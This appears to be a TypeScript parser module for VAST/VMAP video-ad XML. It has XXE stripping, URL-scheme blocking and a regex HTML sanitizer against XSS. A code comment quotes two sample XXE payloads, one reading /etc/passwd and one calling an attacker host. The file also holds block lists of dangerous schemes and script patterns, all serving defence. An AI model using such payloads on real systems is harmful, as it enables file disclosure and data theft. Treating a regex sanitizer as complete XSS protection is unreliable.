/**
 * XML Parser Utilities for VAST/VMAP
 *
 * Provides safe, validated XML parsing with proper error handling
 * and entity decoding for VAST/VMAP documents.
 */

import { XMLParser, XMLBuilder, XmlBuilderOptions } from 'fast-xml-parser';
import { VASTError, VASTErrorCode, VASTWarning } from './types';
import logger from '../../../utils/logger';

// =============================================================================
// Constants
// =============================================================================

/**
 * Maximum allowed XML document size (10MB)
 * 
 * This protects against DoS via oversized documents while being generous
 * for legitimate VAST/VMAP use cases. Typical VAST documents are 5-50KB,
 * with complex wrapper chains rarely exceeding 500KB total.
 * 
 * 10MB allows for:
 * - Multiple wrapper resolutions concatenated
 * - Large ad pods with many creatives
 * - Verbose extensions and metadata
 * - Future expansion headroom
 */
export const MAX_XML_SIZE_BYTES = 10 * 1024 * 1024; // 10MB

// =============================================================================
// Parser Configuration
// =============================================================================

/**
 * XML parser options optimized for VAST/VMAP
 */
const XML_PARSER_OPTIONS = {
  // Preserve attribute names
  ignoreAttributes: false,
  attributeNamePrefix: '@_',
  
  // Handle CDATA properly
  cdataPropName: '__cdata',
  
  // Text node handling
  textNodeName: '#text',
  
  // Trim whitespace
  trimValues: true,
  
  // Parse attribute values
  parseAttributeValue: true,
  
  // Handle numeric values carefully (keep as string for URLs etc.)
  parseTagValue: false,
  
  // Allow boolean attributes
  allowBooleanAttributes: true,
  
  // Handle special chars
  processEntities: true,
  htmlEntities: true,
  
  // Preserve order for important elements
  preserveOrder: false,
  
  // Handle comments
  commentPropName: '__comment',
  
  // Stop on first error
  stopNodes: [],
  
  // Transform tag names to consistent format
  transformTagName: (tagName: string) => tagName,
  
  // Handle arrays properly for elements that can repeat
  isArray: (name: string, jpath: string) => {
    // Elements that can appear multiple times
    const arrayElements = [
      'Ad',
      'Impression',
      'Error',
      'Creative',
      'MediaFile',
      'TrackingEvent',
      'ClickTracking',
      'CustomClick',
      'Extension',
      'AdVerification',
      'Verification',
      'Icon',
      'Companion',
      'NonLinear',
      'Category',
      'UniversalAdId',
      'ClosedCaptionFile',
      'InteractiveCreativeFile',
      'IconViewTracking',
      'AdBreak',
    ];
    
    return arrayElements.includes(name);
  },
};

// =============================================================================
// XML Parser Class
// =============================================================================

export interface ParseXMLResult<T> {
  /** Parsed data */
  data: T | null;
  
  /** Parse success */
  success: boolean;
  
  /** Errors */
  errors: VASTError[];
  
  /** Warnings */
  warnings: VASTWarning[];
  
  /** Raw XML */
  rawXml: string;
}

export class VASTXMLParser {
  private parser: XMLParser;
  private builder: XMLBuilder;
  
  constructor() {
    this.parser = new XMLParser(XML_PARSER_OPTIONS);
    this.builder = new XMLBuilder({
      ignoreAttributes: false,
      attributeNamePrefix: '@_',
      cdataPropName: '__cdata',
      textNodeName: '#text',
    } as XmlBuilderOptions);
  }
  
  /**
   * Parse XML string to JavaScript object
   */
  parse<T = unknown>(xml: string): ParseXMLResult<T> {
    const errors: VASTError[] = [];
    const warnings: VASTWarning[] = [];
    const rawXml = xml;
    
    // Validate input
    if (!xml || typeof xml !== 'string') {
      errors.push({
        code: VASTErrorCode.XML_PARSE_ERROR,
        message: 'Invalid input: XML must be a non-empty string',
      });
      return { data: null, success: false, errors, warnings, rawXml };
    }
    
    // Size limit check - protect against DoS via oversized documents
    const xmlSizeBytes = Buffer.byteLength(xml, 'utf8');
    if (xmlSizeBytes > MAX_XML_SIZE_BYTES) {
      const sizeMB = (xmlSizeBytes / (1024 * 1024)).toFixed(2);
      const limitMB = (MAX_XML_SIZE_BYTES / (1024 * 1024)).toFixed(0);
      
      logger.warn('[VASTXMLParser] Rejected oversized XML document', {
        sizeBytes: xmlSizeBytes,
        limitBytes: MAX_XML_SIZE_BYTES,
        sizeMB,
      });
      
      errors.push({
        code: VASTErrorCode.XML_PARSE_ERROR,
        message: `XML document too large: ${sizeMB}MB exceeds ${limitMB}MB limit`,
      });
      return { data: null, success: false, errors, warnings, rawXml: '' };
    }
    
    // Trim and normalize whitespace
    const normalizedXml = this.normalizeXml(xml);
    
    // Check for XML declaration
    if (!normalizedXml.startsWith('<?xml') && !normalizedXml.startsWith('<VAST') && !normalizedXml.startsWith('<vmap')) {
      warnings.push({
        code: 'MISSING_XML_DECLARATION',
        message: 'XML declaration is missing',
        severity: 'low',
      });
    }
    
    try {
      const result = this.parser.parse(normalizedXml);
      
      // Validate we got a valid object
      if (!result || typeof result !== 'object') {
        errors.push({
          code: VASTErrorCode.XML_PARSE_ERROR,
          message: 'XML parsing resulted in invalid data',
        });
        return { data: null, success: false, errors, warnings, rawXml };
      }
      
      return {
        data: result as T,
        success: true,
        errors,
        warnings,
        rawXml,
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown XML parse error';
      
      logger.warn('[VASTXMLParser] XML parse error', { error: errorMessage });
      
      errors.push({
        code: VASTErrorCode.XML_PARSE_ERROR,
        message: `XML parse error: ${errorMessage}`,
        context: { rawXml: xml.substring(0, 500) },
      });
      
      return { data: null, success: false, errors, warnings, rawXml };
    }
  }
  
  /**
   * Build XML string from JavaScript object
   */
  build(obj: unknown): string {
    return this.builder.build(obj);
  }
  
  /**
   * Normalize XML string and remove potentially dangerous content (XXE protection)
   */
  private normalizeXml(xml: string): string {
    let normalized = xml
      .trim()
      // Normalize line endings
      .replace(/\r\n/g, '\n')
      .replace(/\r/g, '\n')
      // Remove BOM
      .replace(/^\uFEFF/, '');
    
    // XXE Protection: Remove DOCTYPE declarations which can contain external entity references
    // This prevents attacks like:
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]>
    const doctypeRegex = /<!DOCTYPE[^>]*>/gi;
    if (doctypeRegex.test(normalized)) {
      logger.warn('[VASTXMLParser] Stripped DOCTYPE declaration (XXE protection)');
      normalized = normalized.replace(doctypeRegex, '');
    }
    
    // Remove any remaining entity declarations (belt and suspenders)
    const entityRegex = /<!ENTITY[^>]*>/gi;
    if (entityRegex.test(normalized)) {
      logger.warn('[VASTXMLParser] Stripped ENTITY declaration (XXE protection)');
      normalized = normalized.replace(entityRegex, '');
    }
    
    // Collapse multiple whitespace in text content (but not in attributes)
    return normalized.replace(/>[\s]+</g, '><');
  }
  
  /**
   * Extract text content from a node
   */
  static getTextContent(node: unknown): string | null {
    if (node === null || node === undefined) {
      return null;
    }
    
    if (typeof node === 'string') {
      return node.trim();
    }
    
    if (typeof node === 'number' || typeof node === 'boolean') {
      return String(node);
    }
    
    if (typeof node === 'object') {
      const obj = node as Record<string, unknown>;
      
      // Handle CDATA
      if ('__cdata' in obj) {
        return String(obj.__cdata).trim();
      }
      
      // Handle text node
      if ('#text' in obj) {
        return String(obj['#text']).trim();
      }
      
      // Handle direct text content
      if ('_' in obj) {
        return String(obj._).trim();
      }
    }
    
    return null;
  }
  
  /**
   * Extract attribute value from a node
   */
  static getAttribute(node: unknown, attrName: string): string | null {
    if (!node || typeof node !== 'object') {
      return null;
    }
    
    const obj = node as Record<string, unknown>;
    const prefixedAttr = `@_${attrName}`;
    
    if (prefixedAttr in obj) {
      const value = obj[prefixedAttr];
      if (value === null || value === undefined) {
        return null;
      }
      return String(value);
    }
    
    return null;
  }
  
  /**
   * Get numeric attribute with default
   */
  static getNumericAttribute(node: unknown, attrName: string, defaultValue?: number): number | null {
    const strValue = this.getAttribute(node, attrName);
    
    if (strValue === null) {
      return defaultValue ?? null;
    }
    
    const numValue = parseFloat(strValue);
    
    if (isNaN(numValue)) {
      return defaultValue ?? null;
    }
    
    return numValue;
  }
  
  /**
   * Get boolean attribute
   */
  static getBooleanAttribute(node: unknown, attrName: string, defaultValue = false): boolean {
    const strValue = this.getAttribute(node, attrName);
    
    if (strValue === null) {
      return defaultValue;
    }
    
    const lowerValue = strValue.toLowerCase();
    return lowerValue === 'true' || lowerValue === '1' || lowerValue === 'yes';
  }
  
  /**
   * Ensure an element is always an array
   */
  static ensureArray<T>(value: T | T[] | null | undefined): T[] {
    if (value === null || value === undefined) {
      return [];
    }
    
    if (Array.isArray(value)) {
      return value;
    }
    
    return [value];
  }
  
  /**
   * Get first element from potentially array or single value
   */
  static getFirst<T>(value: T | T[] | null | undefined): T | null {
    if (value === null || value === undefined) {
      return null;
    }
    
    if (Array.isArray(value)) {
      return value[0] ?? null;
    }
    
    return value;
  }
  
  /**
   * Parse duration string to seconds
   * Supports: HH:MM:SS, HH:MM:SS.mmm, MM:SS, SS, percentage%
   */
  static parseDuration(duration: string | null | undefined): number | null {
    if (!duration) {
      return null;
    }
    
    const trimmed = duration.trim();
    
    // Percentage format
    if (trimmed.endsWith('%')) {
      return null; // Return null for percentage, caller should handle
    }
    
    // HH:MM:SS.mmm or MM:SS or SS format
    const parts = trimmed.split(':').map(p => parseFloat(p));
    
    if (parts.some(isNaN)) {
      return null;
    }
    
    let seconds: number;
    
    if (parts.length === 1) {
      // Just seconds
      seconds = parts[0];
    } else if (parts.length === 2) {
      // MM:SS
      seconds = parts[0] * 60 + parts[1];
    } else if (parts.length === 3) {
      // HH:MM:SS
      seconds = parts[0] * 3600 + parts[1] * 60 + parts[2];
    } else {
      return null;
    }
    
    // Validate: must be finite, non-negative, and reasonable (max 24 hours)
    if (!Number.isFinite(seconds) || seconds < 0 || seconds > 86400) {
      return null;
    }
    
    return seconds;
  }
  
  /**
   * Parse offset string (time or percentage)
   * Returns { type: 'time', seconds } or { type: 'percentage', percent }
   */
  static parseOffset(offset: string | null | undefined): { type: 'time'; seconds: number } | { type: 'percentage'; percent: number } | null {
    if (!offset) {
      return null;
    }
    
    const trimmed = offset.trim();
    
    // Percentage format
    if (trimmed.endsWith('%')) {
      const percent = parseFloat(trimmed.slice(0, -1));
      if (!isNaN(percent)) {
        return { type: 'percentage', percent };
      }
      return null;
    }
    
    // Time format
    const seconds = this.parseDuration(trimmed);
    if (seconds !== null) {
      return { type: 'time', seconds };
    }
    
    return null;
  }
  
  /**
   * Format seconds to HH:MM:SS.mmm
   */
  static formatDuration(seconds: number): string {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    
    const hh = hours.toString().padStart(2, '0');
    const mm = minutes.toString().padStart(2, '0');
    const ss = secs.toFixed(3).padStart(6, '0');
    
    return `${hh}:${mm}:${ss}`;
  }
  
  /**
   * Dangerous URL schemes that should be blocked (XSS/security vectors)
   */
  private static readonly DANGEROUS_SCHEMES = [
    'javascript:',
    'vbscript:',
    'data:',
    'file:',
    'blob:',
  ];

  /**
   * Check if a URL scheme is dangerous (XSS vector)
   */
  static isDangerousUrl(url: string): boolean {
    const lowerUrl = url.toLowerCase().trim();
    return this.DANGEROUS_SCHEMES.some(scheme => lowerUrl.startsWith(scheme));
  }

  /**
   * Decode URL from XML (handles entities)
   * Blocks dangerous URL schemes (javascript:, data:, etc.) for security
   */
  static decodeUrl(url: string | null | undefined): string | null {
    if (!url) {
      return null;
    }
    
    try {
      // Decode XML entities
      let decoded = url
        .replace(/&amp;/g, '&')
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&quot;/g, '"')
        .replace(/&apos;/g, "'")
        .replace(/&#(\d+);/g, (_, code) => String.fromCharCode(parseInt(code, 10)))
        .replace(/&#x([0-9a-f]+);/gi, (_, code) => String.fromCharCode(parseInt(code, 16)));
      
      // Trim whitespace and newlines
      decoded = decoded.trim().replace(/[\r\n\t]/g, '');
      
      // SECURITY: Block dangerous URL schemes (XSS vectors)
      if (this.isDangerousUrl(decoded)) {
        logger.warn('[VASTXMLParser] Blocked dangerous URL scheme', { 
          url: decoded.substring(0, 50) + '...' 
        });
        return null;
      }
      
      // Validate URL format - allow http, https, and protocol-relative URLs
      if (!decoded.startsWith('http://') && !decoded.startsWith('https://') && !decoded.startsWith('//')) {
        // For non-standard schemes, verify it's not trying to bypass security
        if (decoded.includes(':')) {
          const scheme = decoded.split(':')[0].toLowerCase();
          // Only allow http/https schemes explicitly
          if (scheme !== 'http' && scheme !== 'https') {
            logger.warn('[VASTXMLParser] Blocked unknown URL scheme', { scheme });
            return null;
          }
        }
        // Relative URLs without scheme are allowed
      }
      
      return decoded;
    } catch {
      return url.trim();
    }
  }
  
  /**
   * Validate URL is safe
   */
  static isValidUrl(url: string | null | undefined): boolean {
    if (!url) {
      return false;
    }
    
    try {
      // Must be an absolute URL with http or https protocol
      const parsed = new URL(url);
      return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
      return false;
    }
  }
  
  /**
   * Extract URLs with macro placeholders
   */
  static extractUrlWithMacros(url: string): { url: string; macros: string[] } {
    const macroRegex = /\[([A-Z_]+)\]|\{([A-Z_]+)\}|%5B([A-Z_]+)%5D/g;
    const macros: string[] = [];
    
    let match: RegExpExecArray | null;
    while ((match = macroRegex.exec(url)) !== null) {
      const macroName = match[1] || match[2] || match[3];
      if (macroName && !macros.includes(macroName)) {
        macros.push(macroName);
      }
    }
    
    return { url, macros };
  }
  
  /**
   * Replace macros in URL
   */
  static replaceMacros(url: string, values: Record<string, string | number>): string {
    let result = url;
    
    for (const [key, value] of Object.entries(values)) {
      const encodedValue = encodeURIComponent(String(value));
      
      // Escape regex special characters in key to prevent ReDoS
      const escapedKey = key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      
      // Replace various macro formats
      result = result
        .replace(new RegExp(`\\[${escapedKey}\\]`, 'gi'), encodedValue)
        .replace(new RegExp(`\\{${escapedKey}\\}`, 'gi'), encodedValue)
        .replace(new RegExp(`%5B${escapedKey}%5D`, 'gi'), encodedValue);
    }
    
    return result;
  }
}

// =============================================================================
// Schema Validation (Optional)
// =============================================================================

/**
 * Basic VAST structure validator
 * For full XML schema validation, consider using libxmljs2 or similar
 */
export function validateVASTStructure(parsed: Record<string, unknown>): VASTWarning[] {
  const warnings: VASTWarning[] = [];
  
  // Check for VAST root element
  if (!('VAST' in parsed)) {
    warnings.push({
      code: 'MISSING_VAST_ROOT',
      message: 'Document does not have a VAST root element',
      severity: 'high',
    });
    return warnings;
  }
  
  const vast = parsed.VAST as Record<string, unknown>;
  
  // Check version attribute
  const version = VASTXMLParser.getAttribute(vast, 'version');
  if (!version) {
    warnings.push({
      code: 'MISSING_VERSION',
      message: 'VAST version attribute is missing',
      severity: 'medium',
    });
  }
  
  // Check for Ad elements
  if (!('Ad' in vast)) {
    warnings.push({
      code: 'NO_ADS',
      message: 'VAST document contains no Ad elements',
      severity: 'medium',
    });
  }
  
  return warnings;
}

/**
 * Basic VMAP structure validator
 */
export function validateVMAPStructure(parsed: Record<string, unknown>): VASTWarning[] {
  const warnings: VASTWarning[] = [];
  
  // Check for vmap root element
  const vmapKey = Object.keys(parsed).find(k => k.toLowerCase().includes('vmap'));
  
  if (!vmapKey) {
    warnings.push({
      code: 'MISSING_VMAP_ROOT',
      message: 'Document does not have a VMAP root element',
      severity: 'high',
    });
    return warnings;
  }
  
  const vmap = parsed[vmapKey] as Record<string, unknown>;
  
  // Check version attribute
  const version = VASTXMLParser.getAttribute(vmap, 'version');
  if (!version) {
    warnings.push({
      code: 'MISSING_VERSION',
      message: 'VMAP version attribute is missing',
      severity: 'medium',
    });
  }
  
  return warnings;
}

// =============================================================================
// Exports
// =============================================================================

export default VASTXMLParser;

// MAX_XML_SIZE_BYTES is already exported at declaration

/**
 * Sanitize HTML resource content to prevent XSS attacks.
 * SECURITY: This removes dangerous tags and attributes from HTML.
 * 
 * @param html - Raw HTML content from VAST HTMLResource
 * @returns Sanitized HTML string safe for client rendering
 */
export function sanitizeHtmlResource(html: string | null | undefined): string | undefined {
  if (!html) {
    return undefined;
  }

  // Dangerous patterns to remove
  const dangerousPatterns = [
    // Script tags and content
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    // Event handlers
    /\bon\w+\s*=/gi,
    // JavaScript URLs
    /javascript\s*:/gi,
    // Data URLs (can contain scripts)
    /data\s*:[^,]*base64/gi,
    // VBScript (IE)
    /vbscript\s*:/gi,
    // Expression (IE)
    /expression\s*\(/gi,
    // Import rules
    /@import/gi,
    // Object/embed/applet tags
    /<(object|embed|applet|iframe|frame|frameset|meta|link|base|form|input|button|select|textarea)[^>]*>/gi,
    /<\/(object|embed|applet|iframe|frame|frameset|meta|link|base|form|input|button|select|textarea)>/gi,
    // Style tags that could contain expressions
    /<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi,
    // SVG with scripts
    /<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi,
    // Math with scripts
    /<math\b[^<]*(?:(?!<\/math>)<[^<]*)*<\/math>/gi,
    // HTML comments (can contain IE conditional)
    /<!--[\s\S]*?-->/g,
    // XML processing instructions
    /<\?[\s\S]*?\?>/g,
    // CDATA sections
    /<!\[CDATA\[[\s\S]*?\]\]>/g,
  ];

  let sanitized = html;
  for (const pattern of dangerousPatterns) {
    sanitized = sanitized.replace(pattern, '');
  }

  // Remove dangerous attributes from remaining tags
  // Matches style attributes that might contain expressions
  sanitized = sanitized.replace(/\sstyle\s*=\s*["'][^"']*expression[^"']*["']/gi, '');

  // Trim and return
  return sanitized.trim() || undefined;
}
